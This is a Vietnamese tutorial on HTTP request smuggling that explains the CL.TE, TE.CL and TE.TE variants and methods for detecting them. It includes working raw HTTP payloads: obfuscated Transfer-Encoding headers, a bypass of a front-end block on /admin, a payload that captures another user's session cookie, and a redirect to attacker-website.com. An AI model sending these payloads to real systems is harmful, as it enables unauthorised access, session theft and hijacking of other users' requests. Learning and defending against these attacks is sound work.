## **HTTP request smuggling là gì?**

- HTTP request smuggling là một kỹ thuật can thiệp vào cách một trang web xử lý các chuỗi yêu cầu HTTP nhận được từ một hoặc nhiều người dùng. Các lỗ hổng HTTP request smuggling về bản chất thường rất nghiêm trọng, cho phép kẻ tấn công vượt qua các biện pháp kiểm soát bảo mật, giành quyền truy cập trái phép vào dữ liệu nhạy cảm và trực tiếp xâm phạm những người dùng ứng dụng khác.

### HTTP request smuggling phát sinh như thế nào

- Đặc điểm kĩ thuật HTTP có 2 cách khác nhau để kết thúc request:
  - Header `Content-Length`: nó chỉ định độ dài của nội dung thư tính bằng byte
  - Header `Transfer-Encoding`: Giá trị "chunked" của trường Transfer-Encoding chỉ ra rằng dữ liệu đang được truyền dưới dạng các khối (chunks) có kích thước động.

- Khi sử dụng mã hóa "chunked", dữ liệu được chia thành các khối nhỏ và gửi theo từng khối. Mỗi khối được gửi đi kèm với thông tin về kích thước của khối đó. Quá trình này cho phép truyền dữ liệu mà không cần xác định kích thước tổng thể của nó trước khi bắt đầu truyền.

```
POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0
```

## **Cách thực hiện tấn công HTTP request smuggling**

- CL.TE: Máy chủ front-end sử dụng Content-Length header và máy chủ back-end sử dụng Transfer-Encoding header.
- TE.CL: Máy chủ front-end sử dụng Transfer-Encoding header và máy chủ back-end sử dụng Content-Length header.
- TE.TE: Máy chủ front-end và back-end đều hỗ trợ Transfer-Encoding header, nhưng một trong các máy chủ có thể được yêu cầu không xử lý nó bằng cách làm xáo trộn tiêu đề theo một cách nào đó.

### **CL.TE vulnerabilities**

- Tại đây, front-end sử dụng tiêu đề Content-Length và back-end sử dụng tiêu đề Transfer-Encoding. Chúng ta có thể thực hiện một cuộc tấn công HTTP request smuggling đơn giản như sau:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Tại đây front-end đã xác định được Content-Length : 13.
- Phía back-end xác định bằng Transfer-Encoding và do đó coi nội dung thư là sử dụng mã hóa khối.
  - Nó xử lý đoạn đầu tiên, được cho là có độ dài bằng 0 và do đó được coi là kết thúc yêu cầu.
  - Các byte sau, SMUGGLED, không được xử lý và máy chủ phụ trợ sẽ coi các byte này là phần bắt đầu của yêu cầu tiếp theo trong chuỗi.

### **TE.CL vulnerabilities**

- Tại đây, front-end sử dụng tiêu đề Transfer-Encoding và back-end sử dụng tiêu đề Content-Length. Chúng ta có thể thực hiện một cuộc tấn công HTTP request smuggling đơn giản như sau:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

- Chúng ta cần bao gồm chuỗi dấu \r\n\r\n sau số 0 cuối cùng
- Máy chủ front-end sử dụng tiêu đề Transfer-Encoding và do đó xử lý nội dung thư như sử dụng mã hóa khối.
  - Nó xử lý đoạn đầu tiên, được cho là dài 8 byte, cho đến đầu dòng sau SMUGGLED.
  - Nó xử lý đoạn thứ hai, được cho là có độ dài bằng 0 và do đó được coi là kết thúc yêu cầu. Yêu cầu này được chuyển tiếp đến máy chủ back-end.

- Máy chủ back-end xử lý tiêu đề Content-Length và xác định rằng phần thân yêu cầu dài 3 byte, cho đến đầu dòng tiếp theo 8.
- Các byte sau, bắt đầu bằng SMUGGLED, không được xử lý và máy chủ back-end sẽ coi đây là phần bắt đầu của yêu cầu tiếp theo trong chuỗi.

### **TE.TE behavior: obfuscating the TE header**

- front-end và back-end đều sử dụng tiêu đề Transfer-Encoding. Nhưng một trong các máy chủ có thể không xử lý nó bằng cách làm xáo trộn tiêu đề theo một cách nào đó.

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## **Cách phát hiện lỗ hổng HTTP request smuggling**

### **Finding CL.TE or TE.CL vulnerabilities using timing techniques**

- Nếu một ứng dụng dễ bị biến thể CL.TE của việc request smuggling, thì việc gửi một yêu cầu như sau thường sẽ gây ra sự chậm trễ về thời gian:

```
- CL.TE
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

-----------------------------------------------------------------
- TE.CL
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

- Thử nghiệm dựa trên thời gian cho các lỗ hổng TE.CL sẽ có khả năng làm gián đoạn những người dùng ứng dụng khác nếu ứng dụng dễ bị biến thể CL.TE của lỗ hổng bảo mật.
- Vì vậy, để ẩn danh và giảm thiểu sự gián đoạn, bạn nên sử dụng thử nghiệm CL.TE trước và chỉ tiếp tục thử nghiệm TE.CL nếu lần thử nghiệm đầu tiên không thành công.

### **Confirming HTTP request smuggling vulnerabilities using differential responses**

- Xác nhận lỗ hổng CL.TE bằng phản hồi khác biệt

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

- Nếu cuộc tấn công thành công, thì hai dòng cuối cùng của yêu cầu này được máy chủ back-end coi là thuộc về yêu cầu tiếp theo được nhận.
- Điều này sẽ khiến yêu cầu "bình thường" tiếp theo trông như thế này:

```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

### **Using HTTP request smuggling to bypass front-end security controls**

- Một ứng dụng sử dụng front-end để triển khai các hạn chế kiểm soát truy cập, chỉ chuyển tiếp yêu cầu nếu người dùng được phép truy cập URL được yêu cầu. Sau đó, máy chủ back-end sẽ xử lý mọi yêu cầu mà không cần kiểm tra thêm. Trong tình huống này, một lỗ hổng HTTP request smuggling có thể được sử dụng để vượt qua kiểm soát truy cập, bằng cách smuggle request tới một URL bị hạn chế.

- Giả sử người dùng hiện tại được phép truy cập `/home` nhưng không được phép truy cập `/admin`. Họ có thể bỏ qua hạn chế này bằng cách sử dụng cuộc HTTP request smuggling yêu cầu sau:

```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

- Máy chủ front-end nhìn thấy hai yêu cầu ở đây, cả hai đều dành cho /home, và do đó, các yêu cầu được chuyển tiếp đến máy chủ back-end. Tuy nhiên, máy chủ back-end nhìn thấy một yêu cầu cho /home và một yêu cầu cho /admin. Nó giả định (như mọi khi) rằng các yêu cầu đã đi qua các user interface controls và do đó cấp quyền truy cập vào URL bị hạn chế.

### **Capturing other users' requests**

- Nếu ứng dụng chứa bất kỳ loại chức năng nào cho phép bạn lưu trữ và sau đó truy xuất dữ liệu văn bản, thì bạn có thể sử dụng chức năng này để nắm bắt nội dung yêu cầu của những người dùng khác. Chúng có thể bao gồm mã thông báo phiên hoặc dữ liệu nhạy cảm khác do người dùng gửi.
- Các chức năng phù hợp để sử dụng làm phương tiện cho cuộc tấn công này sẽ là nhận xét, email, mô tả hồ sơ, tên hiển thị, v.v.

- Để thực hiện cuộc tấn công, bạn cần smuggle một POST request đến chức năng lưu trữ, với tham số chứa dữ liệu để lưu trữ được đặt ở vị trí cuối cùng trong yêu cầu.
- Ví dụ: giả sử một ứng dụng sử dụng yêu cầu sau để gửi nhận xét về bài đăng trên blog, nhận xét này sẽ được lưu trữ và hiển thị trên blog:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```

- Bây giờ, hãy xem xét điều gì sẽ xảy ra nếu bạn gửi HTTP request smuggling tương đương với tiêu đề Độ dài nội dung quá dài và tham số nhận xét được đặt ở cuối yêu cầu như sau:

```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

- Tiêu đề Content-Length của smuggle request cho biết rằng phần thân sẽ dài 400 byte, nhưng chúng tôi chỉ gửi 144 byte.
  - Trong trường hợp này, máy chủ back-end sẽ đợi 256 byte còn lại trước khi đưa ra phản hồi, nếu không sẽ đưa ra thời gian chờ nếu điều này không đến đủ nhanh.
  - Do đó, khi một yêu cầu khác được gửi đến máy chủ back-end trên cùng một kết nối, 256 byte đầu tiên sẽ được thêm một cách hiệu quả vào smuggle request như sau:

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```

### **Using HTTP request smuggling to turn an on-site redirect into an open redirect**

- Nhiều ứng dụng thực hiện chuyển hướng tại chỗ từ URL này sang URL khác và đặt tên máy chủ từ tiêu đề Máy chủ lưu trữ của yêu cầu vào URL chuyển hướng.
- Một ví dụ về điều này là hành vi mặc định của máy chủ web Apache và IIS, trong đó yêu cầu thư mục không có dấu gạch chéo ở cuối sẽ nhận được chuyển hướng đến cùng thư mục có dấu gạch chéo ở cuối:

```
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

- Hành vi này thường được coi là vô hại, nhưng nó có thể bị khai thác trong một cuộc tấn công HTTP request smuggling để chuyển hướng người dùng khác đến miền bên ngoài. Ví dụ:

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

- Smuggled request sẽ kích hoạt chuyển hướng đến trang web của kẻ tấn công, điều này sẽ ảnh hưởng đến yêu cầu của người dùng tiếp theo được máy chủ back-end xử lý. Ví dụ:

```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
